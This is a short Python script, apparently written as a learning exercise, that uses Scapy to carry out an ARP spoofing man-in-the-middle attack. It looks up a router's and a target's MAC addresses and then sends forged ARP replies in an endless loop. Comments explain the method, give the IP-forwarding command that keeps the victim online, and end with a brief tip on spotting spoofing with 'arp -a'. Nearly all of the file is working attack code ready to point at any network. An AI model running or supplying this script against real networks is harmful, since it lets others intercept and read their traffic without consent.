import scapy.all as scapy
import sys, time

## Pretend we can't communicate with a target machine--> find MAc address for that machine
## How?? --> send custom packet using Scapy that tricks target into sending us MAC address

#psrc= own IP address
#hwsrd= own MAC address (hardware source)
#src = target MAC (source)
#hwdst/pdst=destination for MAC/destination for packet

#Functions
def get_MAC_address(ip_address):
#Broadcast MAC address--> all bits set to 1, delivered to all machines on network
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    ARP_layer = scapy.ARP(pdst=ip_address)
#Layer the 2 layers to craft custom packet to send- this is basically what scapy is for
    full_metal_packet = broadcast/ARP_layer
#Since our response is composed of 2 lists, we specify response srp[0]
    reponse = scapy.srp(full_metal_packet, timeout=2, verbose=True)[0] #verbose=True will show u everything
#Retrieve MAC address from target response
    return reponse[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
#Create 2 packets: 1 to router, 1 to target. This is how u become the "man in the middle"
#OP set to 1-> ARP request; OP=2 ARP response
    evil_router_packet = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    evil_target_packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(evil_router_packet, evil_target_packet)
# Notice we've manipulated the psrc addresses in each packet to position ourselves in middle of network convo

#We need to run this program in terminal as ARP_Spoofer.py {router_IP} {target_IP}; zeroth arg is the program call
router_IP = sys.argv[1]
target_IP = sys.argv[2]
router_MAC = str(get_MAC_address(router_IP))
target_MAC = str(get_MAC_address(target_IP))

print(f'[+] Router MAC: {router_MAC}, [+] Target Machine MAC: {target_MAC}')

try:
    while True:
        spoof(router_IP, target_IP, router_MAC, target_MAC)
        time.sleep(3)
except KeyboardInterrupt:
    print('[_-] Closing ARP Spoofer')
    exit(0)

## HOWEVER, in order to ensure the target actually maintains an internet connection, we must forward packets to the router/target once we are between them
## In terminal, use {ARP_Spoofer.py}# echo 1 >> /proc/sys/net/ipv4/ip_forward
## This is the key to a man-in-the-middle attack
## How to tell if this is working/happening to u? --> Use arp -a in terminal and examine ARP table
## If there's one MAC for 2 different IPs, ur getting ARP spoofed.
